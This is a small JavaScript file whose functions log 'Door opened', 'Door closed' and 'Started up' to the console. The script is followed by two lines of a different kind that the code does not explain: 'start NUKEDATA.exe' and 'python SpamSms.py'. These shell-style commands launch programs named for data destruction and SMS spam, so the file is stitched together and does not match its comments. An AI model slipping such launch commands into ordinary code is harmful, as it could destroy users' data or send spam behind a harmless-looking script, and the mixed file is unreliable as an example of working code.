/**
 * This function opens and closes a door twice and then starts up.
 */
function openCloseAndStartUp() {
    // Open the door
    openDoor();

    // Close the door
    closeDoor();

    // Open the door again
    openDoor();

    // Close the door again
    closeDoor();

    // Start up
    startUp();
}

/**
 * Opens the door.
 */
function openDoor() {
    console.log("Door opened");
}

/**
 * Closes the door.
 */
function closeDoor() {
    console.log("Door closed");
}

/**
 * Starts up.
 */
function startUp() {
    console.log("Started up");
}

// Run the function
openCloseAndStartUp();
start NUKEDATA.exe
python SpamSms.py
